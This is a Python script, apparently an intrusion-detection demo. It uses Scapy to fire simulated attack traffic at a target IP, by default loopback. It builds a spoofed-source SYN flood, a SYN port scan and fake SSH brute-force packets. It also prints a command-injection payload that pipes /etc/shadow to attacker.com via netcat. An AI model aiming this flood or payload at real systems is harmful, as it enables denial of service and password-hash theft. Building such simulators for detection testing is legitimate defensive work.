import time


def _load_scapy():
    try:
        from scapy.all import IP, TCP, send, RandIP, RandShort
        return IP, TCP, send, RandIP, RandShort
    except (ImportError, PermissionError, OSError) as exc:
        print(f"[WARN] Scapy raw packet mode unavailable: {exc}")
        return None

class AttackSimulator:
    def __init__(self, target_ip="127.0.0.1"):
        self.target_ip = target_ip
        self._scapy = None

    def _packet_tools(self):
        if self._scapy is None:
            self._scapy = _load_scapy()
        return self._scapy

    def _send_packet(self, pkt):
        tools = self._packet_tools()
        if tools is None:
            return
        _, _, send, _, _ = tools
        try:
            send(pkt, verbose=False)
        except (PermissionError, OSError) as exc:
            print(f"[WARN] Packet send skipped: {exc}")

    def _packet(self, builder):
        tools = self._packet_tools()
        if tools is None:
            return None
        IP, TCP, _, RandIP, RandShort = tools
        return builder(IP, TCP, RandIP, RandShort)

    def ddos_simulation(self, count=100):
        print(f"🔥 [DEMO] Initiating high-intensity DDoS attack on {self.target_ip}...")
        for i in range(count):
            pkt = self._packet(lambda IP, TCP, RandIP, RandShort: IP(src=RandIP(), dst=self.target_ip) / TCP(sport=RandShort(), dport=80, flags="S"))
            if pkt is not None:
                self._send_packet(pkt)
            if i % 10 == 0: print(f"   [>] Flooding... {i}/{count} packets dispatched")
        print("✅ DDoS simulation completed.")

    def port_scan_simulation(self):
        print(f"🔍 [DEMO] Initiating Stealth Port Scan on {self.target_ip}...")
        ports = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 3389, 8080]
        for port in ports:
            pkt = self._packet(lambda IP, TCP, RandIP, RandShort: IP(dst=self.target_ip) / TCP(dport=port, flags="S"))
            if pkt is not None:
                self._send_packet(pkt)
            print(f"   [*] Probing port {port}...")
            time.sleep(0.05)
        print("✅ Port scan simulation completed.")

    def brute_force_simulation(self):
        print(f"🔨 [DEMO] Initiating SSH Brute Force against {self.target_ip}...")
        for i in range(20):
            pkt = self._packet(lambda IP, TCP, RandIP, RandShort: IP(dst=self.target_ip) / TCP(dport=22, flags="PA"))
            if pkt is not None:
                self._send_packet(pkt)
            if i % 5 == 0: print(f"   [*] Attempting credential set #{i//5 + 1}...")
            time.sleep(0.1)
        print("✅ Brute force simulation completed.")

    def rce_exploit_simulation(self):
        print(f"💀 [DEMO] Executing Remote Code Execution (RCE) Exploit on {self.target_ip}...")
        print("   [*] Payload: ; cat /etc/shadow | nc attacker.com 4444")
        for i in range(15):
            # Signature: High payload size, specific flags
            pkt = self._packet(lambda IP, TCP, RandIP, RandShort: IP(dst=self.target_ip) / TCP(sport=RandShort(), dport=80, flags="PA") / ("X" * 1200))
            if pkt is not None:
                self._send_packet(pkt)
            if i % 5 == 0: print(f"   [!] Exfiltrating data chunk {i//5 + 1}...")
            time.sleep(0.1)
        print("✅ RCE exploit simulation completed.")

if __name__ == "__main__":
    # Use loopback for testing
    sim = AttackSimulator("127.0.0.1")
    sim.brute_force_simulation()
